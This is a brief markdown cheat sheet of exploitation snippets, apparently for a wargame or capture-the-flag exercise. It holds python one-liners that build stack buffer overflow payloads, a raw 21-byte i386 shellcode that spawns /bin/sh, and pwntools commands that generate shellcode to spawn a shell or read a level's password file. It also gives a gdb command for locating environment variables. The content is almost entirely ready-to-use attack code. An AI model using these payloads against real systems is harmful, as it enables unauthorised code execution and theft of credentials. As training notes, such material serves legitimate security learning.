# Reverse Engineering

- [GCC](#gcc)
- [OverFlow](#overflow)
- [Shellcode](#shellcode)

## Overflow
### Basic
```
(python -c "import struct; print('A' * (100 - 0) + struct.pack('<I', 0xffffffff))")
```

### Shellcode
```
(python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (100 - 21) + struct.pack('<I', 0xffffffff))")
```

## Shellcode
### Cat
```
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass')); print(shell); print(len(shell))"
```

### Exec sh 1
```
python -c "import pwn; shell = pwn.asm(pwn.shellcraft.i386.linux.sh()); print(shell); print(len(shell))"
```

### Exec sh 2
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
21
```

## GCC
### Get env address
```
x/10s **(char***)&environ
```
